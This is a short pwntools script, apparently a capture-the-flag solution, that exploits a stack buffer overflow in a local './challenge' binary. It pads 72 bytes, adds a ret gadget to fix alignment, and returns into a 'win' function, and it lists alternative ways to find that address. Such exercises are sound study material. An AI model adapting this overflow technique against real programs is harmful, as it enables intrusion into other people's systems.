from pwn import *

elf = ELF('./challenge')
context.binary = elf

offset = 72
win_address = 0x401166
# or
win_address = elf.symbols['win']
# or
win_address = elf.sym['win']
# or
win_address = elf.functions['win'].address
ret_gadget = 0x40101a  # or find using ROP(elf).find_gadget(['ret'])[0]

payload = b'A' * offset
payload += p64(ret_gadget)  # Fix stack alignment
payload += p64(win_address)  # Then jump to win

p = process('./challenge')

p.sendlineafter(b'input: ', payload)

p.interactive()